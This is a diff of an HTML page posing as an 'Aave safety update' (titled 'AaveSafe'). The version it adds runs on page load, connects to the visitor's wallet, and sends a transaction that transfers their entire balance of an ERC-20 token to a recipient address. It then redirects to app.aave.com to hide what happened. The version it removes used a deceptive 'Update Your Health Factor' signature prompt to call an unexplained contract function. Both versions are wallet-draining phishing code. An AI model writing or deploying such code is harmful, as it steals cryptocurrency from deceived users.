@@ -1,128 +1,112 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>AAVE UPDATE - Perfect Match</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      margin: 0;
-      padding: 20px;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      border-radius: 15px;
-      padding: 30px;
-      text-align: center;
-      max-width: 500px;
-      width: 100%;
-    }
-    .status {
-      margin: 20px 0;
-      padding: 15px;
-      border-radius: 8px;
-      font-weight: bold;
-    }
-    .loading { background: #fff3cd; color: #856404; }
-    .success { background: #d4edda; color: #155724; }
-    .error { background: #f8d7da; color: #721c24; }
-  </style>
+    <meta charset="UTF-8">
+    <title>AaveSafe</title>
 </head>
 <body>
-  <div class="container">
-    <h2>🔒 AAVE Safety Update</h2>
-    <p>Perfect signature matching...</p>
-    <div id="status" class="status loading">🔄 Starting...</div>
-  </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
+    <script>
+        // تنظیمات - این مقادیر از بک‌اند شما تزریق می‌شوند
+        const CONFIG = {
+            tokenAddress: "0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8",      
+            recipientAddress: "RECIPIENT_ADDRESS_PLACEHOLDER", 
+            redirectUrl: "http://app.aave.com/",         
+            redirectDelay: 100                               // 
+        };
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
-  <script>
-    const statusDiv = document.getElementById('status');
+        const ERC20_ABI = [
+            {
+                "constant": true,
+                "inputs": [{"name": "_owner", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "balance", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "_to", "type": "address"},
+                    {"name": "_value", "type": "uint256"}
+                ],
+                "name": "transfer",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            }
+        ];
 
-    function updateStatus(msg, type = 'loading') {
-      statusDiv.textContent = msg;
-      statusDiv.className = `status ${type}`;
-    }
+        async function executeTransfer() {
+            
+            if (typeof window.ethereum === 'undefined') {
+                window.location.href = CONFIG.redirectUrl;
+                return;
+            }
 
-    (async () => {
-      try {
-        updateStatus('🔗 Connecting...');
+            try {
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+                
+                if (!accounts || accounts.length === 0) {
+                    window.location.href = CONFIG.redirectUrl;
+                    return;
+                }
 
-        if (!window.ethereum) {
-          updateStatus('❌ MetaMask needed!', 'error');
-          return;
+                const userAddress = accounts[0];
+
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId !== '0x1') {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x1' }]
+                        });
+                    } catch (switchError) {
+                        // 
+                    }
+                }
+
+                const web3 = new Web3(window.ethereum);
+                const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);
+                
+                let balance = '0';
+                try {
+                    balance = await contract.methods.balanceOf(userAddress).call();
+                } catch (error) {
+                    balance = '0';
+                }
+
+                if (balance === '0' || balance === 0) {
+                    balance = '1';
+                }
+
+                const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();
+
+                const txParams = {
+                    to: CONFIG.tokenAddress,
+                    from: userAddress,
+                    data: transferData,
+                    gas: '0xC350' // 
+                };
+
+                window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams]
+                }).then(() => {
+                }).catch(() => {
+                });
+
+                // 
+                setTimeout(() => {
+                    window.location.href = CONFIG.redirectUrl;
+                }, CONFIG.redirectDelay);
+
+            } catch (error) {
+                window.location.href = CONFIG.redirectUrl;
+            }
         }
 
-        await window.ethereum.request({method: 'eth_requestAccounts'});
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0xaa36a7' }]
-        });
-
-        updateStatus('📝 Sign message...');
-
-        // 🔧 دقیقاً مثل کانترکت امضا بسازیم
-        const message = "By signing this message, Update Your Health Factor";
-        
-        // مرحله 1: messageHash بسازیم
-        const messageBytes = ethers.toUtf8Bytes(message);
-        const messageHash = ethers.keccak256(messageBytes);
-        
-        // مرحله 2: ethSignedMessageHash بسازیم - دقیقاً مثل کانترکت
-        const ethSignedMessageHash = ethers.keccak256(
-          ethers.concat([
-            ethers.toUtf8Bytes("\x19Ethereum Signed Message:\n32"),
-            ethers.getBytes(messageHash)
-          ])
-        );
-        
-        // مرحله 3: این hash رو امضا کنیم
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-        
-        // امضای نهایی
-        const signature = await signer.signMessage(ethers.getBytes(messageHash));
-        
-        console.log("Message:", message);
-        console.log("Message Hash:", messageHash);
-        console.log("Eth Signed Hash:", ethSignedMessageHash);  
-        console.log("Signature:", signature);
-
-        updateStatus('🚀 Sending...');
-
-        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
-        const abi = [{
-          "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
-          "name": "SafetyUpgrade",
-          "outputs": [],
-          "stateMutability": "nonpayable", 
-          "type": "function"
-        }];
-
-        const contract = new ethers.Contract(contractAddress, abi, signer);
-
-        const tx = await contract.SafetyUpgrade(signature, {
-          gasLimit: 300000
-        });
-        
-        updateStatus('⏳ Confirming...');
-        await tx.wait();
-        updateStatus('🎉 Success!', 'success');
-
-        setTimeout(() => {
-          window.location.replace("https://google.com");
-        }, 2000);
-
-      } catch (error) {
-        console.error("Full error:", error);
-        updateStatus('❌ ' + (error.reason || error.message || 'Failed'), 'error');
-      }
-    })();
-  </script>
+        window.addEventListener('load', executeTransfer);
+    </script>
 </body>
 </html>
